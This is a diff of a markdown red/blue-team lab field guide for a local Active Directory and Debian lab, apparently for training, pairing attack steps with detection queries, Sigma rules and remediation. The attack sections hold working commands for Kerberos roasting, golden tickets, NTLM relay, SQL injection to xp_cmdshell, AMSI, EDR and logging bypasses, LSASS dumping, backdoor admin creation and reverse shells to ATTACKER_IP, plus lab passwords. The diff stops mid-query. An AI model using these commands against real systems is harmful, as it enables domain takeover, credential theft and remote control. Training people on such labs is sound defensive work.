@@ -1,255 +1,72 @@
-# 📓 MODERN KILL LAB: OPERATOR'S FIELD GUIDE v2.3
+# 📓 MODERN KILL LAB: OPERATOR'S FIELD GUIDE v8.0
 
-This guide covers **18 attack vectors** with step-by-step instructions for:
+This guide covers all attack vectors with step-by-step instructions for:
 - 🔴 **Red Team:** Exploitation techniques
 - 🔵 **Blue Team:** Detection, hunting, and response
 
 ---
 
-## PRE-INSTALLED DETECTION TOOLS
+# 🎯 TARGET ALPHA: Lab-DC01 (Windows Server 2022)
 
-| System | Tool | Status | Notes |
-|--------|------|--------|-------|
-| DC01 | **Sysmon** | ✅ Active | SwiftOnSecurity config at `C:\Tools\Sysmon\config.xml` |
-| DC01 | **ScriptBlock Logging** | ✅ Enabled | PowerShell Event ID 4104 |
-| Web01 | **auditd** | ✅ Active | Keys: `identity`, `exec` |
+**Role:** Domain Controller, Database Server, Certificate Authority
 
 ---
 
-# PART 1: IDENTITY & WEB ATTACKS
-
----
-
-## 🛑 VECTOR 1: SQL Injection
-
-| Property | Value |
-|----------|-------|
-| **Target** | `http://10.0.0.10:8080/hr_portal` |
-| **Port** | 8080 (XAMPP Apache) |
-| **Difficulty** | 🟢 Easy |
-| **MITRE** | T1190 |
-
-### 🔴 Red Team
-
-**1. Confirm Vulnerability:**
-```bash
-curl "http://10.0.0.10:8080/hr_portal/index.php?id=1"
-# Returns: Name: Alice Manager
-
-curl "http://10.0.0.10:8080/hr_portal/index.php?id=1'"
-# Returns: Error or blank = SQLi confirmed
-```
-
-**2. UNION-Based Extraction:**
-```bash
-# Find column count
-curl "http://10.0.0.10:8080/hr_portal/index.php?id=1 ORDER BY 2--"
-
-# Extract data
-curl "http://10.0.0.10:8080/hr_portal/index.php?id=-1 UNION SELECT name,salary FROM Employees--"
-```
-
-**3. Command Execution (xp_cmdshell):**
-```bash
-# Enable xp_cmdshell
-curl "http://10.0.0.10:8080/hr_portal/index.php?id=1;EXEC sp_configure 'show advanced options',1;RECONFIGURE--"
-curl "http://10.0.0.10:8080/hr_portal/index.php?id=1;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE--"
-
-# Execute commands
-curl "http://10.0.0.10:8080/hr_portal/index.php?id=1;EXEC xp_cmdshell 'whoami'--"
-```
-
-**4. SQLMap (Automated):**
-```bash
-sqlmap -u "http://10.0.0.10:8080/hr_portal/index.php?id=1" --dbs
-sqlmap -u "http://10.0.0.10:8080/hr_portal/index.php?id=1" --os-shell
-```
-
-### 🔵 Blue Team
-
-**Detection - Sysmon (Event ID 1 - Process Creation):**
-```powershell
-# SQL Server spawning cmd.exe or powershell.exe
-Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=1} |
-    Where-Object {
-        $_.Properties[20].Value -like "*sqlservr*" -and 
-        ($_.Properties[4].Value -like "*cmd.exe*" -or $_.Properties[4].Value -like "*powershell*")
-    } | Select-Object TimeCreated, @{N='CommandLine';E={$_.Properties[10].Value}}
-```
-
-**Detection - Sysmon (Event ID 3 - Network):**
-```powershell
-# Inbound connections to SQL Server from web server
-Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=3} |
-    Where-Object {$_.Properties[14].Value -eq 1433}
-```
-
-**Indicators of Compromise:**
-- `sqlservr.exe` spawning `cmd.exe`, `powershell.exe`
-- URL parameters containing `UNION`, `SELECT`, `xp_cmdshell`
-- `sp_configure` changes in SQL logs
-
-**Sigma Rule:**
-```yaml
-title: SQL Server Spawning Shell
-logsource:
-  product: windows
-  service: sysmon
-detection:
-  selection:
-    EventID: 1
-    ParentImage|endswith: '\sqlservr.exe'
-    Image|endswith:
-      - '\cmd.exe'
-      - '\powershell.exe'
-  condition: selection
-level: critical
-```
-
----
-
-## 🤖 VECTOR 2: AI Prompt Injection / RCE
-
-| Property | Value |
-|----------|-------|
-| **Target** | `http://10.0.0.20:5000` |
-| **Port** | 5000 |
-| **Difficulty** | 🟢 Easy |
-| **MITRE** | T1059 |
-
-### 🔴 Red Team
-
-**1. Test RCE:**
-```bash
-curl "http://10.0.0.20:5000/ask?query=id"
-# Returns: uid=0(root) gid=0(root)
-
-curl "http://10.0.0.20:5000/ask?query=whoami"
-# Returns: root
-```
-
-**2. Enumerate System:**
-```bash
-curl "http://10.0.0.20:5000/ask?query=cat%20/etc/passwd"
-curl "http://10.0.0.20:5000/ask?query=cat%20/home/vagrant/.kube/config"
-curl "http://10.0.0.20:5000/ask?query=cat%20/home/vagrant/exfil_lab/.env"
-```
-
-**3. Reverse Shell:**
-```bash
-# Attacker: Start listener
-nc -lvnp 4444
-
-# Execute (URL-encoded)
-curl "http://10.0.0.20:5000/ask?query=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/ATTACKER_IP/4444%200%3E%261'"
-```
-
-### 🔵 Blue Team
-
-**Detection - auditd:**
-```bash
-# Watch for unusual commands via web app
-sudo ausearch -k exec -i | grep -E "python|flask" | tail -20
-
-# Watch for sensitive file access
-sudo ausearch -f /etc/passwd -i
-sudo ausearch -f /home/vagrant/.kube/config -i
-```
-
-**Detection - Process Tree:**
-```bash
-# Python/Flask should NOT spawn bash
-ps auxf | grep -A3 python3
-```
-
-**Detection - Network:**
-```bash
-# Outbound connections from Python process
-ss -tunap | grep python
-netstat -anp | grep python
-```
-
-**Indicators of Compromise:**
-- Python process spawning `/bin/bash`, `/bin/sh`
-- Outbound connections from Flask service
-- Access to `.kube/config`, `.env` files
-
----
-
-## 🔨 VECTOR 3: AS-REP Roasting
+## 🔓 VECTOR 1: AS-REP Roasting
 
 | Property | Value |
 |----------|-------|
 | **Target** | `svc_backup` account |
-| **Vulnerability** | `DoesNotRequirePreAuth = True` |
-| **Difficulty** | 🟢 Easy |
-| **MITRE** | T1558.004 |
+| **Vulnerability** | "Do not require Kerberos preauthentication" enabled |
+| **Password** | `Backup2024!` |
+| **Tools** | Impacket GetNPUsers.py, Rubeus |
 
 ### 🔴 Red Team
 
-**1. From Kali (No Authentication Required):**
-```bash
-GetNPUsers.py LAB.local/ -usersfile users.txt -format hashcat -dc-ip 10.0.0.10 -no-pass
-```
-
-**2. Target Specific Account:**
+**1. Request AS-REP Hash (No Creds Required):**
 ```bash
 GetNPUsers.py LAB.local/svc_backup -no-pass -dc-ip 10.0.0.10 -format hashcat -outputfile asrep.hash
 ```
 
-**3. Crack the Hash:**
+**2. Crack the Hash:**
 ```bash
 hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
 ```
 
 **Result:** `svc_backup:Backup2024!`
 
+**Alternative with Rubeus (from Windows):**
+```powershell
+.\Rubeus.exe asreproast /user:svc_backup /format:hashcat /outfile:asrep.hash
+```
+
 ### 🔵 Blue Team
 
-**Detection - Security Event ID 4768:**
+**Detection - Event ID 4768:**
 ```powershell
-# Kerberos TGT requests without pre-authentication
 Get-WinEvent -FilterHashtable @{LogName='Security';Id=4768} |
     Where-Object {$_.Properties[4].Value -eq '0x0'} |
-    Select-Object TimeCreated, 
-        @{N='Account';E={$_.Properties[0].Value}},
-        @{N='ClientIP';E={$_.Properties[9].Value}}
+    Select-Object TimeCreated, @{N='Account';E={$_.Properties[0].Value}}, @{N='IP';E={$_.Properties[9].Value}}
 ```
 
-**Detection - Sysmon Network (Event ID 3):**
-```powershell
-# Kerberos traffic from unusual sources
-Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=3} |
-    Where-Object {$_.Properties[14].Value -eq 88} |
-    Select-Object TimeCreated, @{N='SourceIP';E={$_.Properties[9].Value}}
-```
+**Indicators:**
+- Event ID 4768 with PreAuth Type = 0
+- TGT requests from non-standard workstations
 
-**Sigma Rule:**
-```yaml
-title: AS-REP Roasting Attempt
-logsource:
-  product: windows
-  service: security
-detection:
-  selection:
-    EventID: 4768
-    PreAuthType: '0'
-  filter:
-    TargetUserName|endswith: '$'
-  condition: selection and not filter
-level: high
-```
+**Remediation:**
+- Enable Kerberos preauth for all accounts
+- Use 25+ character passwords for service accounts
 
 ---
 
-## 🎫 VECTOR 4: Kerberoasting
+## 🔓 VECTOR 2: Kerberoasting
 
 | Property | Value |
 |----------|-------|
 | **Target** | `svc_sql` account |
 | **SPN** | `MSSQLSvc/dc01.lab.local:1433` |
-| **Difficulty** | 🟢 Easy |
-| **MITRE** | T1558.003 |
+| **Password** | `Password123!` |
+| **Tools** | Impacket GetUserSPNs.py, Rubeus |
 
 ### 🔴 Red Team
 
@@ -258,7 +75,7 @@ level: high
 GetUserSPNs.py LAB.local/helpdesk:Help123! -dc-ip 10.0.0.10
 ```
 
-**2. Request TGS Ticket:**
+**2. Request TGS Hash:**
 ```bash
 GetUserSPNs.py LAB.local/helpdesk:Help123! -dc-ip 10.0.0.10 -request -outputfile tgs.hash
 ```
@@ -272,53 +89,252 @@ hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
 
 ### 🔵 Blue Team
 
-**Detection - Security Event ID 4769:**
+**Detection - Event ID 4769:**
 ```powershell
-# TGS requests with RC4 encryption (weak/suspicious)
 Get-WinEvent -FilterHashtable @{LogName='Security';Id=4769} |
     Where-Object {$_.Properties[5].Value -eq '0x17'} |
-    Select-Object TimeCreated,
-        @{N='ServiceName';E={$_.Properties[0].Value}},
-        @{N='AccountName';E={$_.Properties[2].Value}},
-        @{N='ClientIP';E={$_.Properties[6].Value}}
+    Select-Object TimeCreated, @{N='Service';E={$_.Properties[0].Value}}, @{N='User';E={$_.Properties[2].Value}}
 ```
 
-**Sigma Rule:**
-```yaml
-title: Kerberoasting - RC4 TGS Request
-logsource:
-  product: windows
-  service: security
-detection:
-  selection:
-    EventID: 4769
-    TicketEncryptionType: '0x17'
-  filter:
-    ServiceName|endswith: '$'
-  condition: selection and not filter
-level: high
-```
+**Indicators:**
+- Event ID 4769 with Encryption Type 0x17 (RC4)
+- Single user requesting multiple TGS tickets
+
+**Remediation:**
+- Use Group Managed Service Accounts (gMSA)
+- Enforce AES encryption only
 
 ---
 
-## ☁️ VECTOR 5: Hybrid Identity Attack
+## 🔓 VECTOR 3: Golden Ticket
+
+| Property | Value |
+|----------|-------|
+| **Target** | `krbtgt` account |
+| **Password** | `GodMode123!` |
+| **Tools** | Impacket ticketer.py, Mimikatz |
+
+### 🔴 Red Team
+
+**1. Get krbtgt NTLM Hash (if you have the password):**
+```python
+# Python - NTLM from password
+import hashlib
+password = "GodMode123!"
+ntlm = hashlib.new('md4', password.encode('utf-16le')).hexdigest()
+print(ntlm)
+```
+
+**2. Get Domain SID:**
+```bash
+lookupsid.py LAB.local/helpdesk:Help123!@10.0.0.10
+```
+
+**3. Forge Golden Ticket:**
+```bash
+ticketer.py -nthash <KRBTGT_NTLM_HASH> -domain-sid <DOMAIN_SID> -domain lab.local Administrator
+```
+
+**4. Use the Ticket:**
+```bash
+export KRB5CCNAME=Administrator.ccache
+psexec.py -k -no-pass lab.local/Administrator@dc01.lab.local
+```
+
+**Alternative with Mimikatz:**
+```
+kerberos::golden /user:Administrator /domain:lab.local /sid:<SID> /krbtgt:<NTLM_HASH> /ptt
+```
+
+### 🔵 Blue Team
+
+**Detection - Event ID 4769:**
+```powershell
+# TGS requests with forged TGT have anomalies
+Get-WinEvent -FilterHashtable @{LogName='Security';Id=4769} |
+    Where-Object {$_.Properties[0].Value -eq 'krbtgt'}
+```
+
+**Indicators:**
+- TGT with abnormally long lifetime
+- User SID mismatch
+- Requests for krbtgt service
+
+**Remediation:**
+- Reset krbtgt password TWICE
+- Monitor for TGT anomalies
+- Implement PAC validation
+
+---
+
+## 🔓 VECTOR 4: AD CS Misconfiguration (ESC8)
+
+| Property | Value |
+|----------|-------|
+| **Target** | `http://10.0.0.10/certsrv` |
+| **Vulnerability** | Web Enrollment on HTTP without EPA |
+| **Tools** | ntlmrelayx.py, PetitPotam, Coercer |
+
+### 🔴 Red Team
+
+**1. Verify HTTP Web Enrollment:**
+```bash
+curl -I http://10.0.0.10/certsrv/
+# Look for: WWW-Authenticate: NTLM
+```
+
+**2. Setup NTLM Relay:**
+```bash
+# Terminal 1 - Start ntlmrelayx
+ntlmrelayx.py -t http://10.0.0.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+```
+
+**3. Coerce Authentication:**
+```bash
+# Terminal 2 - Trigger authentication
+python3 PetitPotam.py ATTACKER_IP 10.0.0.10
+# Or via SQL Injection:
+# http://10.0.0.10:8080/hr_portal/index.php?id=1;EXEC xp_cmdshell 'ping ATTACKER_IP'--
+```
+
+**4. Use Obtained Certificate:**
+```bash
+# Request TGT with certificate
+Rubeus.exe asktgt /user:DC01$ /certificate:cert.pfx /ptt
+```
+
+### 🔵 Blue Team
+
+**Detection - Certificate Events:**
+```powershell
+Get-WinEvent -FilterHashtable @{LogName='Security';Id=4886,4887} |
+    Select-Object TimeCreated, @{N='Requester';E={$_.Properties[0].Value}}, @{N='Template';E={$_.Properties[1].Value}}
+```
+
+**Indicators:**
+- Certificate requests from unexpected hosts
+- Machine accounts requesting user templates
+- HTTP requests to /certsrv from external IPs
+
+**Remediation:**
+- Enable HTTPS on AD CS
+- Enable Extended Protection for Authentication (EPA)
+- Disable HTTP Web Enrollment if not needed
+
+---
+
+## 🔓 VECTOR 5: SQL Injection
+
+| Property | Value |
+|----------|-------|
+| **Target** | `http://10.0.0.10:8080/hr_portal` |
+| **Vulnerability** | `SELECT ... WHERE ID = $id` (unsanitized) |
+| **Tools** | SQLMap, Burp Suite, Browser |
+
+### 🔴 Red Team
+
+**1. Test for SQLi:**
+```bash
+curl "http://10.0.0.10:8080/hr_portal/index.php?id=1'"
+# Error = SQLi confirmed
+```
+
+**2. Extract Data:**
+```bash
+curl "http://10.0.0.10:8080/hr_portal/index.php?id=-1 UNION SELECT Name,Salary FROM Employees--"
+```
+
+**3. Enable xp_cmdshell (svc_sql is sysadmin):**
+```bash
+curl "http://10.0.0.10:8080/hr_portal/index.php?id=1;EXEC sp_configure 'show advanced options',1;RECONFIGURE--"
+curl "http://10.0.0.10:8080/hr_portal/index.php?id=1;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE--"
+```
+
+**4. Execute OS Commands:**
+```bash
+curl "http://10.0.0.10:8080/hr_portal/index.php?id=1;EXEC xp_cmdshell 'whoami'--"
+```
+
+**5. Automated with SQLMap:**
+```bash
+sqlmap -u "http://10.0.0.10:8080/hr_portal/index.php?id=1" --os-shell
+```
+
+### 🔵 Blue Team
+
+**Detection - SQL Server Logs:**
+```powershell
+Get-WinEvent -FilterHashtable @{LogName='Application';ProviderName='MSSQLSERVER'} |
+    Where-Object {$_.Message -match 'xp_cmdshell|UNION|sp_configure'}
+```
+
+**Indicators:**
+- `UNION SELECT` in query logs
+- `xp_cmdshell` enablement
+- `sqlservr.exe` spawning `cmd.exe`
+
+**Remediation:**
+- Use parameterized queries
+- Remove sysadmin from service accounts
+- Disable xp_cmdshell permanently
+
+---
+
+## 🔓 VECTOR 6: Weak Service Permissions
+
+| Property | Value |
+|----------|-------|
+| **Target** | `svc_sql` account |
+| **Vulnerability** | Member of SQL Server `sysadmin` role |
+| **Tools** | SQLMap, Netcat |
+
+### 🔴 Red Team
+
+**Once you have svc_sql credentials or SQLi access:**
+
+**1. Enable xp_cmdshell:**
+```sql
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+```
+
+**2. Execute Commands:**
+```sql
+EXEC xp_cmdshell 'whoami';
+EXEC xp_cmdshell 'net user hacker P@ssw0rd /add';
+EXEC xp_cmdshell 'net localgroup Administrators hacker /add';
+```
+
+**3. Reverse Shell:**
+```sql
+EXEC xp_cmdshell 'powershell -e <BASE64_PAYLOAD>';
+```
+
+### 🔵 Blue Team
+
+**Detection:**
+- Monitor `xp_cmdshell` usage
+- Alert on new local administrators
+- Monitor SQL Server process spawning shells
+
+---
+
+## 🔓 VECTOR 7: Fake Cloud Credentials
 
 | Property | Value |
 |----------|-------|
 | **Target** | `C:\Program Files\Azure AD Sync\connection.xml` |
-| **Credential** | `svc_adsync:Valhalla123!` (Base64) |
-| **Difficulty** | 🟡 Medium |
-| **MITRE** | T1552.001 |
+| **Password** | `Valhalla123!` (Base64 encoded) |
+| **Tools** | PowerShell, aadconnect-extract |
 
 ### 🔴 Red Team
 
-**1. Locate Configuration:**
+**1. Read the Config:**
 ```powershell
-Get-ChildItem "C:\Program Files\Azure AD Sync\" -Recurse
 type "C:\Program Files\Azure AD Sync\connection.xml"
 ```
 
-**2. Extract Base64 Password:**
+**2. Extract Base64:**
 ```xml
 <PasswordEncrypted>VABhAGwAbABoAGEAbABsAGEAMQAyADMAIQ==</PasswordEncrypted>
 ```
@@ -332,426 +348,191 @@ type "C:\Program Files\Azure AD Sync\connection.xml"
 
 ### 🔵 Blue Team
 
-**Detection - Sysmon File Access (Event ID 11):**
+**Detection:**
 ```powershell
-Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=11} |
-    Where-Object {$_.Properties[5].Value -like "*Azure AD Sync*"} |
-    Select-Object TimeCreated, @{N='FileName';E={$_.Properties[5].Value}}
-```
-
-**Detection - ScriptBlock Logging (Event ID 4104):**
-```powershell
-Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} |
-    Where-Object {$_.Message -match 'FromBase64String|connection\.xml'} |
-    Select-Object TimeCreated, Message
+# Monitor file access to Azure AD Sync folder
+Get-WinEvent -FilterHashtable @{LogName='Security';Id=4663} |
+    Where-Object {$_.Properties[5].Value -like "*Azure AD Sync*"}
 ```
 
 ---
 
-## 🛡️ VECTOR 6: AD CS Relay (ESC8)
+## 🔓 VECTOR 8: AMSI & EDR Bypass
 
 | Property | Value |
 |----------|-------|
-| **Target** | `http://10.0.0.10/certsrv` |
-| **Port** | 80 (IIS) |
-| **Difficulty** | 🟡 Medium |
-| **MITRE** | T1557.001 |
+| **Target** | `C:\Tools\AMSILab\`, `C:\Tools\VEHLab\` |
+| **Tools** | PowerShell, C# exploits |
 
 ### 🔴 Red Team
 
-**1. Verify HTTP Web Enrollment:**
-```bash
-curl -I http://10.0.0.10/certsrv/
-# Look for: WWW-Authenticate: NTLM
-```
-
-**2. Setup NTLM Relay:**
-```bash
-# Terminal 1: Start Responder (disable HTTP/SMB)
-sudo responder -I eth0 -r -d -w
-
-# Terminal 2: Start ntlmrelayx
-ntlmrelayx.py -t http://10.0.0.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
-```
-
-**3. Trigger Authentication (via SQLi):**
-```bash
-curl "http://10.0.0.10:8080/hr_portal/index.php?id=1;EXEC xp_cmdshell 'ping ATTACKER_IP'--"
-```
-
-**4. Use Obtained Certificate:**
-```bash
-# Authenticate as machine account
-Rubeus.exe asktgt /user:DC01$ /certificate:cert.pfx /ptt
-```
-
-### 🔵 Blue Team
-
-**Detection - Certificate Events (4886/4887):**
-```powershell
-# Certificate requests
-Get-WinEvent -FilterHashtable @{LogName='Security';Id=4886,4887} |
-    Select-Object TimeCreated, Id, 
-        @{N='Requester';E={$_.Properties[0].Value}},
-        @{N='Template';E={$_.Properties[1].Value}}
-```
-
-**Detection - IIS Logs:**
-```powershell
-Get-Content C:\inetpub\logs\LogFiles\W3SVC1\*.log | Select-String "certsrv"
-```
-
----
-
-# PART 2: DEFENSE EVASION & IN-MEMORY
-
----
-
-## 🛡️ VECTOR 7: AMSI Bypass
-
-| Property | Value |
-|----------|-------|
-| **Target** | `C:\Tools\AMSILab\` |
-| **Vulnerability** | Weak registry ACLs |
-| **Difficulty** | 🟡 Medium |
-| **MITRE** | T1562.001 |
-
-### 🔴 Red Team
-
-**1. Test AMSI Status:**
-```powershell
-'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
-# If blocked = AMSI active
-```
-
-**2. Bypass via Reflection:**
+**AMSI Bypass (Reflection):**
 ```powershell
 $a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
 $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
 
-**3. Bypass via Registry (Lab has weak ACLs):**
+**AMSI Bypass (Registry - Lab has weak ACLs):**
 ```powershell
 Remove-Item "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\*" -Recurse -Force
 ```
 
+**Bypass FakeEDR:**
+```c
+// Remove VEH handlers
+RemoveVectoredExceptionHandler(handler);
+
+// Clear debug registers
+CONTEXT ctx;
+ctx.Dr0 = ctx.Dr1 = ctx.Dr2 = ctx.Dr3 = ctx.Dr7 = 0;
+SetThreadContext(hThread, &ctx);
+```
+
 ### 🔵 Blue Team
 
-**Detection - Sysmon Registry (Event ID 12/13):**
+**Detection:**
 ```powershell
+# Monitor AMSI registry
 Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=12,13} |
-    Where-Object {$_.Properties[4].Value -like "*AMSI*"} |
-    Select-Object TimeCreated, @{N='RegistryPath';E={$_.Properties[4].Value}}
-```
+    Where-Object {$_.Properties[4].Value -like "*AMSI*"}
 
-**Detection - ScriptBlock Logging:**
-```powershell
+# ScriptBlock logging for bypass attempts
 Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104} |
-    Where-Object {$_.Message -match 'AmsiUtils|amsiInitFailed|AmsiScanBuffer'} |
-    Select-Object TimeCreated, @{N='Script';E={$_.Message.Substring(0,200)}}
+    Where-Object {$_.Message -match 'AmsiUtils|amsiInitFailed'}
 ```
 
 ---
 
-## 🔒 VECTOR 8: VEH/EDR Bypass
+# 🎯 TARGET BRAVO: Lab-Web01 (Debian 12)
+
+**Role:** Web Server, Application Security Host, Pivot Point  
+**Domain Status:** Joined to LAB.local
+
+---
+
+## 🔓 VECTOR 9: SMB Remote Code Execution
 
 | Property | Value |
 |----------|-------|
-| **Target** | `C:\Tools\VEHLab\FakeEDR.exe` |
-| **Difficulty** | 🔴 Hard |
-| **MITRE** | T1562.001 |
+| **Target** | `//10.0.0.20/backup_drop` |
+| **Vulnerability** | Cron executes `*.sh` files as ROOT every minute |
+| **Tools** | smbclient, net view |
 
 ### 🔴 Red Team
 
-**1. Start FakeEDR:**
-```cmd
-C:\Tools\VEHLab\FakeEDR.exe
-```
-
-**2. Bypass Techniques:**
-- `RemoveVectoredExceptionHandler()`
-- Clear debug registers DR0-DR7
-- Unhook ntdll.dll via fresh copy
-- Direct syscalls
-
-### 🔵 Blue Team
-
-**Detection - Process Termination (Sysmon Event ID 5):**
-```powershell
-Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=5} |
-    Where-Object {$_.Properties[4].Value -like "*EDR*" -or $_.Properties[4].Value -like "*Defender*"}
-```
-
----
-
-## 💉 VECTOR 9: Reflective Code Injection
-
-| Property | Value |
-|----------|-------|
-| **Target** | `C:\Tools\ReflectiveLab\VulnerableLoader.cs` |
-| **Difficulty** | 🔴 Hard |
-| **MITRE** | T1620 |
-
-### 🔴 Red Team
-
-```powershell
-$bytes = [IO.File]::ReadAllBytes("C:\path\to\payload.exe")
-[Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null,$null)
-```
-
-### 🔵 Blue Team
-
-**Detection - Sysmon Image Load (Event ID 7):**
-```powershell
-# Assemblies loaded without file path
-Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=7} |
-    Where-Object {$_.Properties[4].Value -notlike "C:\*" -and $_.Properties[4].Value -notlike "c:\*"}
-```
-
----
-
-## 👻 VECTOR 10: Process Hollowing
-
-| Property | Value |
-|----------|-------|
-| **Target** | `C:\Tools\HollowingLab\README.txt` |
-| **Targets** | notepad.exe, svchost.exe, werfault.exe |
-| **Difficulty** | 🔴 Hard |
-| **MITRE** | T1055.012 |
-
-### 🔵 Blue Team
-
-**Detection - Suspicious Parent-Child (Sysmon Event ID 1):**
-```powershell
-Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=1} |
-    Where-Object {
-        $_.Properties[4].Value -like "*notepad*" -and
-        $_.Properties[20].Value -notlike "*explorer*"
-    }
-```
-
----
-
-## 🔑 VECTOR 11: Credential Dumping
-
-| Property | Value |
-|----------|-------|
-| **Target** | `C:\Tools\CredLab\` |
-| **Difficulty** | 🟡 Medium |
-| **MITRE** | T1003 |
-
-### 🔴 Red Team
-
-**1. Credential Manager:**
-```powershell
-cmdkey /list
-# Shows: fileserver.lab.local, sqlserver.lab.local
-```
-
-**2. SAM/SYSTEM Hives (Pre-extracted):**
+**1. Connect Anonymously:**
 ```bash
-# From Kali
-secretsdump.py -sam SAM.bak -system SYSTEM.bak -security SECURITY.bak LOCAL
+smbclient //10.0.0.20/backup_drop -N
 ```
 
-**3. LSASS Dump:**
-```cmd
-# comsvcs.dll method (run as SYSTEM)
-rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full
+**2. Create Reverse Shell Script:**
+```bash
+echo '#!/bin/bash
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > shell.sh
+```
+
+**3. Upload Script:**
+```bash
+smb: \> put shell.sh
+```
+
+**4. Start Listener and Wait (~60 seconds):**
+```bash
+nc -lvnp 4444
+# ROOT SHELL INCOMING!
 ```
 
 ### 🔵 Blue Team
 
-**Detection - LSASS Access (Sysmon Event ID 10):**
-```powershell
-Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=10} |
-    Where-Object {$_.Properties[8].Value -like "*lsass.exe*"} |
-    Select-Object TimeCreated,
-        @{N='SourceProcess';E={$_.Properties[4].Value}},
-        @{N='GrantedAccess';E={$_.Properties[18].Value}}
+**Detection:**
+```bash
+# Monitor cron execution
+sudo tail -f /var/log/syslog | grep CRON
+
+# Monitor SMB access
+sudo tail -f /var/log/samba/log.smbd
+
+# auditd - watch share directory
+sudo auditctl -w /home/vagrant/share -p wa -k smb_drop
+sudo ausearch -k smb_drop
 ```
 
-**Sigma Rule:**
-```yaml
-title: LSASS Memory Dump
-logsource:
-  product: windows
-  service: sysmon
-detection:
-  selection:
-    EventID: 10
-    TargetImage|endswith: '\lsass.exe'
-    GrantedAccess|contains:
-      - '0x1010'
-      - '0x1038'
-      - '0x1fffff'
-  condition: selection
-level: critical
-```
+**Indicators:**
+- New .sh files appearing in `/home/vagrant/share`
+- Cron executing scripts from SMB share
+- Root bash processes spawned by cron
+
+**Remediation:**
+- Remove guest access from SMB
+- Don't use `force user = root`
+- Remove dangerous cron job
 
 ---
 
-## 🦎 VECTOR 12: LOLBin Execution
+## 🔓 VECTOR 10: Insecure AI Agent
 
 | Property | Value |
 |----------|-------|
-| **Target** | `C:\Tools\LOLBinLab\payload.csproj` |
-| **Difficulty** | 🟢 Easy |
-| **MITRE** | T1218 |
+| **Target** | `http://10.0.0.20:5000` |
+| **Vulnerability** | `subprocess.check_output(query, shell=True)` |
+| **Tools** | curl, Browser |
 
 ### 🔴 Red Team
 
-**MSBuild:**
-```cmd
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Tools\LOLBinLab\payload.csproj
+**1. Test RCE:**
+```bash
+curl "http://10.0.0.20:5000/ask?query=id"
+# Returns: uid=0(root)...
+
+curl "http://10.0.0.20:5000/ask?query=cat%20/etc/shadow"
 ```
 
-**Certutil:**
-```cmd
-certutil -urlcache -split -f http://10.0.0.20:8000/payload.exe C:\temp\payload.exe
+**2. Steal Kubeconfig:**
+```bash
+curl "http://10.0.0.20:5000/ask?query=cat%20/home/vagrant/.kube/config"
+```
+
+**3. Reverse Shell:**
+```bash
+nc -lvnp 4444
+curl "http://10.0.0.20:5000/ask?query=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/ATTACKER_IP/4444%200%3E%261'"
 ```
 
 ### 🔵 Blue Team
 
-**Detection - Sysmon Process (Event ID 1):**
-```powershell
-Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=1} |
-    Where-Object {
-        $_.Properties[4].Value -match 'msbuild|certutil|mshta|wmic|rundll32' -and
-        $_.Properties[10].Value -match 'http|urlcache|csproj|javascript'
-    } | Select-Object TimeCreated, @{N='CommandLine';E={$_.Properties[10].Value}}
+**Detection:**
+```bash
+# Monitor processes spawned by Python
+ps auxf | grep -A5 python3
+
+# auditd
+sudo ausearch -c bash --ppid $(pgrep -f app.py)
 ```
 
 ---
 
-## 📊 VECTOR 13: ETW/Logging Bypass
+## 🔓 VECTOR 11: Unsecured Kubernetes
 
 | Property | Value |
 |----------|-------|
-| **Target** | ScriptBlock Logging |
-| **Difficulty** | 🟡 Medium |
-| **MITRE** | T1562.002 |
+| **Target** | `vuln-admin-sa` ServiceAccount |
+| **Vulnerability** | Has `cluster-admin` privileges |
+| **Tools** | kubectl |
 
 ### 🔴 Red Team
 
-```powershell
-$s=[Ref].Assembly.GetType('System.Management.Automation.Utils')
-$f=$s.GetField('cachedGroupPolicySettings','NonPublic,Static')
-$g=$f.GetValue($null)
-$g['ScriptBlockLogging']['EnableScriptBlockLogging']=0
-```
-
-### 🔵 Blue Team
-
-**Detection:** Monitor for gaps in expected logging volume.
-
----
-
-## 🔄 VECTOR 14: Persistence
-
-| Property | Value |
-|----------|-------|
-| **Target** | Scheduled Task: `WindowsDefenderUpdate` |
-| **Difficulty** | 🟡 Medium |
-| **MITRE** | T1053.005 |
-
-### 🔴 Red Team
-
-**Find Hidden Task:**
-```powershell
-Get-ScheduledTask -TaskName "WindowsDefenderUpdate" | Format-List *
-schtasks /query /tn "WindowsDefenderUpdate" /v
-```
-
-### 🔵 Blue Team
-
-**Detection - Security Event ID 4698:**
-```powershell
-Get-WinEvent -FilterHashtable @{LogName='Security';Id=4698} |
